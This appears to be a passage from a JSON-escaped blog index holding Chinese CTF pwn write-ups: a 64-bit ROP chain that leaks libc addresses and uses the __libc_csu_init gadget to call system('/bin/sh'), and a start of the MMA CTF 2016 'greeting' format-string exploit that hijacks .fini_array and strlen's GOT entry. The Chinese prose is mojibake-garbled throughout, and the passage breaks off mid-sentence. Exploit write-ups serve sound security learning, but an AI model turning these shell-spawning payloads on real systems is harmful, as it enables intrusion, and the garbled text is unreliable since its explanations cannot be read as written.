b\"B\")\n#ä½¿ç”¨Bå¡«å……200å­—èŠ‚ä¸­é™¤å»å…ˆå‰payloadå‰©ä½™çš„ç©ºé—´ï¼Œå¡«å……çš„åŸå› æ˜¯å› ä¸ºè¿™ä¸ªç¨‹åºéœ€è¦æˆ‘ä»¬è¾“å…¥æ»¡200å­—èŠ‚\n#æ‰ä¼šè·³å‡ºå¾ªç¯ï¼Œè¿›è€Œæ‰æœ‰è¦†ç›–è¿”å›åœ°å€çš„å¯èƒ½ã€‚æˆ–è€…å¯ä»¥å†™æˆï¼š\n#(payload += 'a'*(200-0x48-32))\n```\n\n5.ä¹‹åå¼€å§‹è¿è¡Œpayloadæ¥å®é™…å¾—åˆ°Putså‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio.send(payload)\nio.recvuntil('bye~\\n')#è·³å‡ºå¾ªç¯åæ‰ä¼šæ‰§è¡Œåˆ°æ‰“å°byeçš„åœ°æ–¹\nputs_addr = u64(io.recv()[:-1].ljust(8, b'\\x00'))\n#è¿™é‡Œå°±æ˜¯æ¥æ”¶æ³„éœ²åœ°å€çš„åœ°æ–¹ï¼Œæœ«å°¾éœ€è¦å¡«å……ä¸Š\\x00\nlog.info(\"puts_addr = %#x\", puts_addr)\nsystem_addr = puts_addr - 0xb31e0\nlog.info(\"system_addr = %#x\", system_addr)\n```\n\n6.ç°åœ¨å¾—åˆ°äº†putså‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆputså‡½æ•°ä¸å…¶å®ƒå‡½æ•°çš„åç§»é‡ä¹Ÿå°±å¯ä»¥é€šè¿‡ç”¨IDAæ‰“å¼€é¢˜ç›®ç»™çš„libcæŸ¥å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°å…¶å®ƒæˆ‘ä»¬éœ€è¦çš„å‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n00000000000456A0  ---system_in_libc\n00000000000F8880 ---read_in_libc\n0000000000070920  ---puts_in_libc\n000000000018AC40 ---binsh_in_libc\n```\n\nå¾—åˆ°libcè¢«åŠ è½½çš„é¦–åœ°å€ï¼šputs_addr å‡å» puts_in_libc ç­‰äºlibc_startã€‚äºæ˜¯libc_startåŠ ä¸Šå„è‡ªå‡½æ•°å¯¹åº”çš„in_libcä¹Ÿå°±å¯ä»¥å¾—åˆ°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n7.ç°åœ¨éƒ½æœ‰äº†å°±å¯ä»¥å°è¯•åœ¨æ‰§è¡Œä¸€æ¬¡æ ˆæº¢å‡ºæ¥å¼€shellï¼Œ64ä½ç¨‹åºï¼Œæœ‰äº†systemå‡½æ•°å’Œbinshåœ°å€ï¼Œé‚£ä¹ˆæ ˆæº¢å‡ºè¦†ç›–ç”¨pop rdi;retçš„æ–¹æ³•å¯ä»¥ç›´æ¥getshellã€‚\n\n8.è¿™é‡Œå‡è®¾æ²¡æœ‰binshï¼Œæ¥ä½¿ç”¨ä¸€ä¸‹ä¸‡èƒ½gadgetï¼šé€šè¿‡æˆ‘ä»¬çš„è¾“å…¥è¯»åˆ°å†…å­˜ä¸­ã€‚åŒæ ·è¿™å¼ å›¾ï¼Œä¸‡èƒ½Gadget1ä¸ºloc_400616ï¼Œä¸‡èƒ½Gadget2ä¸ºloc_400600\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552166.png)\n\nä»¥ä¸‹ä¸ºç”¨æ¥è¯»å–binshå­—ç¬¦ä¸²çš„ä»£ç ï¼Œè¿™é‡Œéœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°ä¸€æ®µå¯ä»¥å†™å…¥ä¹‹åä¸ä¼šè¢«ç¨‹åºè‡ªåŠ¨ä¿®æ”¹çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯binsh_addr=0x60107cï¼Œè¿™ä¸ªåœ°å€å…¶å®æ˜¯externçš„åœ°å€ï¼Œé‡Œé¢åŸæ¥ä¿å­˜çš„å†…å®¹æ˜¯readå‡½æ•°å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰çš„åœ°å€ã€‚è€Œå»¶è¿Ÿç»‘å®šå‘ç”Ÿä¹‹åï¼Œgotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å·²ç»è¢«æ”¹æˆäº†è¢«LibcåŠ è½½çš„çœŸå®åœ°å€ï¼Œè¿™ä¸ªexternä¹Ÿå°±æ²¡ç”¨äº†ï¼Œå¯ä»¥éšæ„ç”¨ã€‚ä½†å¦‚æœæŸä¸ªå‡½æ•°æ²¡æœ‰è¢«é¦–æ¬¡è°ƒç”¨ï¼Œå³è¿˜æ²¡å‘ç”Ÿå»¶è¿Ÿç»‘å®šï¼Œè€Œæˆ‘ä»¬å´å…ˆä¸€æ­¥æ”¹æ‰äº†externçš„å†…å®¹ï¼Œé‚£ä¹ˆå®ƒå°±å†ä¹Ÿæ²¡åŠæ³•è¢«è°ƒç”¨äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n\nbinsh_addr = 0x60107c\t\t\t\n#bssæ”¾äº†STDINå’ŒSTDOUTçš„FILEç»“æ„ä½“ï¼Œä¿®æ”¹ä¼šå¯¼è‡´ç¨‹åºå´©æºƒ\n\npayload = b\"A\"*72\npayload += p64(universal_gadget1) #ä¸‡èƒ½gadget1\npayload += p64(0) #rbx = 0\npayload += p64(1)\n#rbp = 1ï¼Œè¿‡æ‰åé¢ä¸‡èƒ½gadget2çš„callè¿”å›åçš„åˆ¤æ–­,ä½¿å®ƒæ­¥è¿›è¡Œè·³è½¬ï¼Œè€Œæ˜¯é¡ºåºæ‰§è¡Œåˆ°ä¸‡\n#èƒ½gadget1ï¼Œä»è€Œreturnåˆ°æœ€å¼€å§‹æ¥å†æ‰§è¡Œæ ˆæº¢å‡ºä»è€ŒGetshellã€‚\n#cmp ç®—æœ¯å‡æ³•è¿ç®—ç»“æœä¸ºé›¶,å°±æŠŠZF(é›¶æ ‡å¿—)ç½®1,cmp a bå³è¿›è¡Œè¿ç®—a-b\npayload += p64(read_got)\n#r12 = gotè¡¨ä¸­readå‡½æ•°é¡¹ï¼Œé‡Œé¢æ˜¯readå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œç›´æ¥é€šè¿‡callè°ƒç”¨\npayload += p64(8) #r13 = 8ï¼Œreadå‡½æ•°è¯»å–çš„å­—èŠ‚æ•°ï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™rdx\npayload += p64(binsh_addr) #r14 = readå‡½æ•°è¯»å–/bin/shä¿å­˜çš„åœ°å€ï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™rsi\npayload += p64(0)\n#r15 = 0ï¼Œreadå‡½æ•°çš„å‚æ•°fdï¼Œå³STDINï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™edi\npayload += p64(universal_gadget2) #ä¸‡èƒ½gadget2\npayload += b'\\x00'*56\n#ä¸‡èƒ½gadget2åæ¥åˆ¤æ–­è¯­å¥ï¼Œè¿‡æ‰ä¹‹åæ˜¯ä¸‡èƒ½gadget1ï¼Œè€ŒLoc_400616ä¸‡èƒ½gadget1æ‰§è¡Œä¹‹\n#åä¼šä½¿å¾—æ ˆç©ºé—´å‡å°‘7*8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå‰è¾“å…¥7*8æ¥ä½¿å¾—ä¸‡èƒ½gadget1æ‰§è¡Œä¹‹\n#åæ ˆçš„ä½ç½®ä¸å‘ç”Ÿå˜åŒ–ï¼Œä»è€Œèƒ½æ­£å¸¸retä¹‹åæ¥ä¸Šçš„start_addr\n#ç”¨äºå¡«å……æ ˆï¼Œè¿™é‡Œç”¨Aä¹Ÿæ˜¯ä¸€æ ·\npayload += p64(start_addr) #è·³è½¬åˆ°startï¼Œæ¢å¤æ ˆ\npayload = payload.ljust(200, b\"B\") #padding\n#ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œå»æ‰ä¸€æ ·å¯ä»¥getshellï¼Œå› ä¸ºè¿™è¾¹æ˜¯ç›´æ¥è°ƒç”¨readå‡½æ•°ï¼Œè€Œä¸æ˜¯ç»è¿‡\n#sub_40068E()éå¾—æ³¨æ»¡200å­—èŠ‚æ‰èƒ½è·³å‡ºå¾ªç¯ã€‚\n\nio.send(payload)\nio.send(b\"/bin/sh\\x00\")\n#ä¸Šé¢çš„ä¸€æ®µpayloadè°ƒç”¨äº†readå‡½æ•°è¯»å–\"/bin/sh\\x00\"ï¼Œè¿™é‡Œå‘é€å­—ç¬¦ä¸²\n#ä¹‹åå›åˆ°ç¨‹åºèµ·å§‹ä½ç½®start\n```\n\nè¿™é‡Œä¸‡èƒ½Gadgetä¸­ç»™r12èµ‹å€¼ï¼Œä¼ å…¥çš„ä¸€å®šæ˜¯è¯¥å‡½æ•°çš„gotè¡¨ï¼Œå› ä¸ºè¿™é‡Œçš„callå’Œå¸¸è§„çš„callæœ‰ç‚¹ä¸å¤ªä¸€æ ·ã€‚æˆ‘ä»¬åœ¨IDAè°ƒè¯•æ—¶æŒ‰ä¸‹Dè½¬æ¢æˆç¡¬ç¼–ç å½¢å¼ï¼Œ(è¿™é‡Œå¯ä»¥åœ¨IDAä¸­é€‰é¡¹-å¸¸è§„-åæ±‡ç¼–-æ“ä½œç å­—èŠ‚æ•°è®¾ç½®ä¸º8)å¯ä»¥çœ‹åˆ°è¿™ä¸ªcallçš„ç¡¬ç¼–ç æ˜¯FFï¼Œè€Œå¸¸è§„çš„callç¡¬ç¼–ç æ˜¯E8ã€‚(è¿™é‡Œcallç¡¬ç¼–ç ä¹‹åçš„å­—èŠ‚ä»£è¡¨çš„æ˜¯åˆå¹¶ç¨‹åºæ®µä¹‹å‰çš„åç§»é‡ï¼Œå…·ä½“å¯ä»¥å‚è€ƒé™æ€ç¼–è¯‘ã€åŠ¨æ€ç¼–è¯‘ã€é“¾æ¥æ–¹é¢çš„çŸ¥è¯†)åœ¨è¿™ä¸ªæŒ‡ä»¤é›†ä¸‹é¢ï¼š\n\nFFçš„callåé¢è·Ÿçš„æ˜¯åœ°å€çš„åœ°å€ã€‚ä¾‹å¦‚call [func], è·³è½¬çš„åœ°æ–¹å°±åº”è¯¥æ˜¯funcè¿™ä¸ªåœ°å€é‡Œä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯*funcã€‚\n\nE8çš„callåé¢è·Ÿçš„æ˜¯åœ°å€ã€‚ä¾‹å¦‚call funcï¼Œè·³è½¬çš„åœ°æ–¹å°±æ˜¯funcçš„å¼€å¤´ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552928.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552607.jpeg)\n\nè¿™é‡Œå¯ä»¥ä¸ç”¨éå¾—çœ‹ç¡¬ç¼–ç ï¼Œå¯ä»¥ç›´æ¥çœ‹æ±‡ç¼–ä¹Ÿå¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼šä¸€ä¸ªæœ‰[],ä¸€ä¸ªæ²¡æœ‰[]ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552863.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552842.jpeg)\n\n9.æ‰€ä»¥ä¸‡èƒ½gadgetä¸­é€šè¿‡r12ï¼Œä¼ å…¥è·³è½¬å‡½æ•°çš„åœ°å€åªèƒ½æ˜¯å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹åçš„gotè¡¨åœ°å€ï¼Œè€Œä¸èƒ½æ˜¯pltè¡¨åœ°å€æˆ–è€…æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„gotè¡¨åœ°å€ï¼Œ(å»¶è¿Ÿç»‘å®šåªèƒ½é€šè¿‡pltè¡¨æ¥æ“ä½œï¼Œæ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰ï¼Œè¯¥gotè¡¨ä¸­çš„å†…å®¹æ˜¯ç­‰åŒäºæ— æ•ˆçš„ï¼Œåªæ˜¯ä¸€ä¸ªexternæ®µçš„åç§»åœ°å€ï¼Œé™¤éè¯¥å‡½æ•°funcæ˜¯é™æ€ç¼–è¯‘è¿›ç¨‹åºé‡Œé¢çš„ï¼Œé‚£ä¹ˆgotè¡¨ä¸­çš„å†…å®¹å°±æ˜¯è¯¥å‡½æ•°çš„çœŸå®æœ‰æ•ˆåœ°å€ï¼Œä¸ä¼šå‘ç”Ÿå»¶è¿Ÿç»‘å®šã€‚)å› ä¸ºpltè¡¨ä¸­çš„å†…å®¹è½¬æ¢æˆç¡¬ç¼–ç å‹æ ¹å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œæ›´åˆ«è¯´è·³è½¬åˆ°è¯¥åœ°å€ä¿å­˜çš„å†…å®¹çš„åœ°æ–¹äº†ã€‚æœ‰äººè¯´è·³è½¬åˆ°pltè¡¨æ‰§è¡Œçš„å°±æ˜¯è·³è½¬gotè¡¨ï¼Œé‚£åº”è¯¥æ˜¯ä¸€æ ·çš„å•Šï¼Œä½†FFçš„callå¹¶ä¸æ˜¯è·³è½¬åˆ°pltæ¥æ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œè€Œæ˜¯å–pltè¡¨ä¸­å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†è·³è½¬åˆ°è¯¥åœ°å€æ¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥æœ‰æ—¶å€™éœ€è¦çœ‹æ±‡ç¼–ä»£ç æ¥å†³å®šç©¶ç«Ÿæ˜¯ä¼ å…¥gotè¡¨è¿˜æ˜¯ä¼ å…¥pltè¡¨ã€‚åŒæ ·ä¹Ÿå¯ä»¥çœ‹åˆ°pltè¡¨ä¸­çš„ç¡¬ç¼–ç æ˜¯FFï¼Œä¹Ÿå°±æ˜¯å¹¶ä¸æ˜¯è·³è½¬gotè¡¨ï¼Œè€Œæ˜¯å–gotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†æ¥è·³è½¬ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552806.jpeg)\n\nâ–²è¯´äº†è¿™ä¹ˆå¤šï¼Œè®°ä½ä¸€ä¸ªå°±è¡Œäº†ï¼Œ\n\néœ€è¦è·³è½¬å‡½æ•°æ—¶ï¼Œæœ‰[]çš„-åªèƒ½ä¼ gotè¡¨ï¼Œæ²¡[]çš„-ä¼ pltè¡¨(pltè¡¨æ›´å®‰å…¨å¥½ä½¿ï¼Œä½†åé¢æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒgotè¡¨åˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œæƒ…å†µæ¯”è¾ƒå¤æ‚)ã€‚\n\néœ€è¦æ‰“å°çœŸå®å‡½æ•°åœ°å€æ—¶ï¼Œä¼ çš„ä¸€å®šæ˜¯gotè¡¨ï¼Œè¿™æ ·å°±ä¸€å®šæ²¡é”™ã€‚\n\nå½“æœ‰call eax;è¿™ç±»è¯­å¥æ—¶ï¼Œeaxä¸­ä¿å­˜çš„ä¸€å®šå¾—æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œå› ä¸ºè¿™é‡Œçš„callç¡¬ç¼–ç ä¹Ÿæ˜¯0FFã€‚(å®é™…æƒ…å†µgotå’Œpltæ¥å›è°ƒç€ç”¨å‘—ï¼Œå“ªä¸ªå¥½ä½¿ç”¨å“ªä¸ª)\n\n10.é‚£ä¹ˆç°åœ¨æœ‰äº†system_addrå’Œbinsh_addrï¼Œè€Œç¨‹åºåˆæ˜¯ä»æœ€å¼€å§‹è¿è¡Œï¼Œæ‰€ä»¥ç°åœ¨å°è¯•getshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = b\"A\"*72 #padding\npayload += p64(pop_rdi) #ç»™systemå‡½æ•°ä¼ å‚\npayload += p64(binsh_addr) #rdi = &(\"/bin/sh\\x00\")\npayload += p64(system_addr) #è°ƒç”¨systemå‡½æ•°æ‰§è¡Œsystem(\"/bin/sh\")\npayload = payload.ljust(200, b\"B\") #paddingï¼Œè·³å‡ºå¾ªç¯\nio.send(payload)\nio.interactive()\n```\n\n11.å¦å¤–ç”±äºåœ¨libcä¸­æŸ¥æ‰¾ä¹Ÿæ¯”è¾ƒç¹çï¼Œæ‰€ä»¥æœ‰ä¸ªlibcSearchå¯ä»¥ç®€åŒ–ä½¿ç”¨ï¼Œå…·ä½“æŸ¥èµ„æ–™å§ã€‚\n\n \n\nâ–²\n\n1.å¾€putså‡½æ•°ä¸­ä¼ å…¥å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼ˆelf.gotï¼‰å‚æ•°å¯ä»¥æ‰“å°å‡ºè¢«åŠ è½½åœ¨Libcä¸­çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n2.ç”¨è¦†ç›–è¿”å›åœ°å€retçš„å½¢å¼è°ƒç”¨å‡½æ•°éœ€è¦ç”¨å‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ï¼Œï¼ˆelf.pltï¼‰è¿™æ˜¯åº“å‡½æ•°åœ°å€ï¼Œéœ€è¦å…ˆåˆ°pltä¸­ï¼Œç„¶åå†åˆ°gotè¡¨ä¸­ï¼Œè¿™æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ã€‚\n\n3.ä½†å¦‚æœåœ¨gadgetä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡ç»™r12èµ‹å€¼æ¥è°ƒç”¨elf.gotè¡¨ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯call qword ptr[r12+rbx*8]ï¼ŒæŒ‡å‘çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çœŸå®åœ°å€ï¼Œéœ€è¦çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚å¦‚æœåªæ˜¯call addrï¼Œåˆ™åº”è¯¥æ˜¯callå‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ã€‚\n\n4.ä¸‡èƒ½gadgetä¸€èˆ¬åœ¨_libc_csu_initä¸­ï¼Œæˆ–è€…initæˆ–è€…ç›´æ¥ROPgadgetæŸ¥ä¹Ÿå¯ä»¥\n\n \n\nâ–²movå’ŒleaåŒºåˆ«ï¼š\n\nmov:å¯¹äºå˜é‡ï¼ŒåŠ ä¸åŠ []éƒ½è¡¨ç¤ºå–å€¼ï¼›å¯¹äºå¯„å­˜å™¨è€Œè¨€ï¼Œæ— []è¡¨ç¤ºå–å€¼ï¼Œæœ‰[]è¡¨ç¤ºå–åœ°å€ã€‚\n\nlea:å¯¹äºå˜é‡ï¼Œå…¶åé¢çš„æœ‰æ— []çš†å¯ï¼Œéƒ½è¡¨ç¤ºå–å˜é‡åœ°å€ï¼Œç›¸å½“äºæŒ‡é’ˆã€‚å¯¹äºå¯„å­˜å™¨è€Œè¨€ï¼Œæ— []è¡¨ç¤ºå–åœ°å€ï¼Œæœ‰[]è¡¨ç¤ºå–å€¼ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"MMA CTF 2nd 2016-greeting","url":"/2021/08/14/MMA CTF 2nd 2016-greeting/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†canaryå’ŒNXã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œmainå‡½æ•°ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nchar v5; // [esp+5Ch] [ebp-44h]\nchar s; // [esp+1Ch] [ebp-84h]\n-----------------------------------------------------\nif ( !getnline(&v5, 64) )\nsprintf(&s, \"Nice to meet you, %s :)\\n\", &v5);\nreturn printf(&s);\n```\n\n2.å†æ‰¾systemï¼Œæœ‰å¯¼å…¥ï¼Œæ²¡æœ‰binshï¼Œæ²¡æœ‰Libcã€‚ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹æŸä¸ªå‡½æ•°çš„gotè¡¨æŒ‡å‘systemå‡½æ•°ï¼Œç„¶åå†æ¬¡è¿è¡Œç¨‹åºå¾—ä»¥è¾“å…¥binshä¼ ç»™è¯¥å‡½æ•°ï¼Œç›¸å½“äºè°ƒç”¨systemå‡½æ•°ï¼Œä¹‹åå°±å¯ä»¥getshellã€‚ä½†æ˜¯å‘ç°è¯¥ç¨‹åºä¸­æ²¡æœ‰å¾ªç¯ï¼Œä¿®æ”¹ä¹‹åæ²¡åŠæ³•å†æ¬¡è¾“å…¥ã€‚\n\n3.è¿™é‡Œéœ€è¦ç”¨åˆ°cè¯­è¨€çš„ç»“æ„æ‰§è¡Œï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541317.png)\n\ncè¯­è¨€ç¼–è¯‘åï¼Œæ‰§è¡Œé¡ºåºå¦‚å›¾æ‰€ç¤ºï¼Œæ€»çš„æ¥è¯´å°±æ˜¯åœ¨mainå‡½æ•°å‰ä¼šè°ƒç”¨.initæ®µä»£ç å’Œ.init_arrayæ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ ·çš„ï¼Œmainå‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨.finiæ®µä»£ç å’Œ.fini._arraryæ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚\n\n4.åˆ©ç”¨Mainå‡½æ•°ç»“æŸæ—¶ä¼šè°ƒç”¨finiæ®µçš„å‡½æ•°ç»„è¿™ä¸€ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å°è¯•æ‰¾åˆ°finiå‡½æ•°ç»„çš„åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥ä¿®æ”¹è¯¥åœ°å€ï¼Œä¿®æ”¹.fini_arrayæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œä½¿å¾—Mainå‡½æ•°é€€å‡ºæ—¶è¿è¡Œè¯¥åœ°å€å¯ä»¥é‡å¤å›åˆ°startæ¥å†æ¬¡æ‰§è¡Œä¸€æ¬¡è¾“å…¥ã€‚\n\n5.fini_arrayæ®µçš„åœ°å€ç›´æ¥ctrl+så°±å¯ä»¥æ‰¾åˆ°ï¼Œå†…å®¹æ˜¯__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_auxï¼Œä¿å­˜çš„å†…å®¹æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å¯¹åº”æ˜¯ä¸€ä¸ªä»£ç æ®µï¼Œè¯¥ä»£ç æ®µçš„å‡½æ•°åä¸º__do_global_dtors_aux proc nearã€‚å…¶å®ƒå‡½æ•°å¯¹åº”çš„got,pltå¯ä»¥é€šè¿‡elf.pot\\\\elf.pltå¯¹åº”çš„æ¥æœç´¢ã€‚\n\n6.ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œè¦å°†ä»€ä¹ˆåœ°å€åŠ«æŒä¸ºsystemå‡½æ•°ï¼Ÿè¿™ä¸ªåœ°å€å¿…é¡»æ˜¯åœ¨getlineæœ€åæˆ–è€…æ˜¯ä¹‹åï¼Œè€Œä¸”è¿˜éœ€è¦æœ‰å‚æ•°æ¥æ‰§è¡Œbinshã€‚ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯sprintfï¼Œå› ä¸ºè¯¥å‡½æ•°åœ¨getlineå‡½æ•°ä¹‹åï¼Œå¹¶ä¸”ä»å³å¾€å·¦æ•°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¿å­˜çš„å†…å®¹ï¼Œä½†æ˜¯å°è¯•è¿‡åå‘ç°å´©æºƒäº†ï¼Œä¿®æ”¹æ˜¯èƒ½ä¿®æ”¹ï¼Œä½†æ˜¯ä¼ å‚çš„æ—¶å€™æœ‰ç‚¹é—®é¢˜ã€‚åé¢æŸ¥çœ‹è¯¥å‡½æ•°æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541342.jpeg)\n\nå¯ä»¥çœ‹åˆ°æŸ¥çœ‹è¯¥å‡½æ•°ä»æ ˆä¸Šå–çš„ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯sè¿™ä¸ªæ•°ç»„ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ç©¿çš„v5ï¼Œè€Œå¦‚æœåŠ«æŒä¸ºsystemå‡½æ•°ï¼Œé‚£ä¹ˆå°±è¦æ±‚æ ˆä¸Šçš„espæŒ‡å‘çš„å†…å®¹çš„åœ°å€æ˜¯binshå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œç¡®å®æŒ‡å‘sè¿™ä¸ªæ•°ç»„ä¸­çš„å†…å®¹ï¼Œä¸ºç©ºï¼Œé‚£ä¹ˆsystemå‡½æ•°å°±æ²¡åŠæ³•è°ƒç”¨æˆåŠŸäº†ã€‚åé¢åˆçœ‹printfå‡½æ•°ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œå› ä¸ºè¿™é‡Œprintfå‡½æ•°çš„å‚æ•°ä¹Ÿæ˜¯sè¿™ä¸ªæ•°ç»„ï¼Œå†…å®¹æ­¤æ—¶ä¸ºç©ºï¼Œæ— æ³•é¡ºåˆ©è°ƒç”¨ã€‚ä¹‹åå†æ‰¾ï¼Œç»è¿‡getnlineå‡½æ•°å†…éƒ¨å¯ä»¥å‘ç°æœ‰ä¸ªstrlenå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#ä»£ç ä¸­çš„å½¢å¼ï¼š\nif ( !getnline(&v5, 64) )\n----------------------------------------------------------------\ngetnline(char *s, int n)\nreturn strlen(s);\n\n#è¯¥å‡½æ•°åŸå‹ï¼š\nunsigned int strlen(const char *str);\n-------------------------------------------------------\n#systemå‡½æ•°åŸå‹ï¼š\nint system(const char *command); \n```\n\nsystemå‡½æ•°è°ƒç”¨è§„åˆ™æ˜¯éœ€è¦ä¸€ä¸ªåœ°å€ï¼Œåœ°å€ä¸Šä¿å­˜çš„å†…å®¹æ˜¯binshå­—ç¬¦ä¸²ï¼Œæˆ–è€…ç›´æ¥\"binsh\"å­—ç¬¦ä¸²èµ‹äºˆï¼ŒCè¯­è¨€ä¸­å°±ä»£è¡¨åœ¨å…¨å±€å˜é‡ä¸­å¼€è¾Ÿä¸€å—å†…å­˜ï¼Œç„¶åè¯¥å†…å­˜ä¿å­˜çš„æ˜¯binshå­—ç¬¦ä¸²ï¼Œç„¶åå°†è¯¥å†…å­˜çš„åœ°å€èµ‹äºˆç»™systemå‡½æ•°å½“ä½œå‚æ•°è¿è¡Œã€‚æ€»ä¹‹å°±æ˜¯systemå‡½æ•°éœ€è¦çš„å‚æ•°æ˜¯ä¸€ä¸ªåœ°å€ã€‚\n\nè¿™é‡Œçš„strlenæ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œè™½ç„¶ä¸Šé¢å†™çš„åªæ˜¯sï¼Œä½†æ˜¯sä¸­ä¿å­˜çš„å†…å®¹æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¾“å…¥AAAAï¼Œé€šè¿‡è°ƒè¯•æŸ¥çœ‹å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540223.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540170.jpeg)\n\nåŒæ ·çš„ï¼ŒæŸ¥çœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540150.jpeg)\n\nå¯ä»¥çœ‹åˆ°[esp+s]ç›¸å½“äºæ˜¯å–sçš„æ ˆåœ°å€èµ‹å€¼ç»™eaxï¼Œç„¶åeaxèµ‹å€¼ç»™espæ ˆé¡¶ï¼Œè¿™ä¸¤è¡Œç ´ä»£ç æœ‰ç—…ï¼Œä¸€æ¯›ä¸€æ ·ã€‚æ‰€ä»¥ç°åœ¨è·³è½¬è¿›strlenä¸­çš„è¯ï¼Œespçš„å€¼ä¹Ÿå°±æ˜¯å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œå†…å®¹å°±æ˜¯AAAAã€‚ä¹Ÿå°±ç›¸å½“äºåœ¨strlenä¸­çš„sçš„å€¼æ˜¯ä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆåŠ«æŒåï¼Œå°±ç›¸å½“äºsystem(s)ï¼ŒåŒæ 